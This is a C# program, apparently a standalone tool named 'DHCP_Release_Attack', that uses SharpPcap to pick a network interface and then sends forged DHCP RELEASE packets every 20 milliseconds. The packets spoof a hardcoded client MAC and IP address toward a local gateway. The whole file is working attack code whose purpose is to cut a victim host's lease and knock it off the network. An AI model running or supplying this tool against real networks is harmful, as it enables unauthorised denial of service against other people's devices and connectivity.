using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using SharpPcap.Npcap;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

namespace DHCP_Release_Attack
{
    class Program
    {
        private static ICaptureDevice device;
        static void Main(string[] args)
        {
            // Retrieve the device list
            var devices = CaptureDeviceList.Instance;

            // If no devices were found print an error
            if (devices.Count < 1)
            {
                Console.WriteLine("No devices were found on this machine");
                return;
            }

            int i = 0;

            // Print out the devices
            foreach (var dev in devices)
            {
                /* Description */
                Console.WriteLine("{0}) {1}", i, dev.Description);
                i++;
            }

            Console.WriteLine();
            Console.Write("-- Please choose a device to capture: ");
            i = int.Parse(Console.ReadLine());

            device = devices[i];

            // Open the device for capturing
            int readTimeoutMilliseconds = 1000;
            if (device is NpcapDevice)
            {
                var nPcap = device as NpcapDevice;
                nPcap.Open(SharpPcap.Npcap.OpenFlags.DataTransferUdp | SharpPcap.Npcap.OpenFlags.NoCaptureLocal, readTimeoutMilliseconds);
            }
            else if (device is LibPcapLiveDevice)
            {
                var livePcapDevice = device as LibPcapLiveDevice;
                livePcapDevice.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
            }
            else
            {
                throw new InvalidOperationException("unknown device type of " + device.GetType().ToString());
            }

            while (true)
            {
                sendDhcpRelease(PhysicalAddress.Parse("5E-31-5A-76-A9-17"), IPAddress.Parse("192.168.178.90"), PhysicalAddress.Parse("E0-28-6D-5E-36-B6"), IPAddress.Parse("192.168.178.1"));
                Thread.Sleep(20);
            }           
        }

        private static void sendDhcpRelease(PhysicalAddress pSourceHwAddress, IPAddress pSourceIpAddress, PhysicalAddress pDestinationHwAddress, IPAddress pDestinationIpAddress)
        {
            PhysicalAddress ethernetSourceHwAddress = pSourceHwAddress;
            PhysicalAddress ethernetDestinationHwAddress = pDestinationHwAddress;

            var ethernetPacket = new EthernetPacket(ethernetSourceHwAddress,
                                                    ethernetDestinationHwAddress,
                                                    EthernetType.None);


            var ipPacket = new IPv4Packet(pSourceIpAddress, pDestinationIpAddress);

            const ushort udpSourcePort = 68;
            const ushort udpDestinationPort = 67;
            var udpPacket = new UdpPacket(udpSourcePort, udpDestinationPort);

            //-- Combine all bytes to single byte
            byte[] payload = buildDhcpReleasePacket(pSourceIpAddress, pSourceHwAddress);

            udpPacket.PayloadData = payload;
            ipPacket.PayloadPacket = udpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            device.SendPacket(ethernetPacket);
            Console.WriteLine("DHCP Release successful send " + DateTime.Now.ToShortTimeString());
        }

        private static byte[] buildDhcpReleasePacket(IPAddress pClientIpAddress, PhysicalAddress pClientHwAddress)
        {
            Random rand = new Random();
            byte[] _transactionID = new byte[4];
            rand.NextBytes(_transactionID);

            DhcpReleasePacket dhcpReleasePacket = new DhcpReleasePacket()
            {
                transactionID = _transactionID,
                clientIP = pClientIpAddress.GetAddressBytes(),
                clientMac = pClientHwAddress.GetAddressBytes(),                
            };

            return dhcpReleasePacket.buildPacket();
        }
    }
}
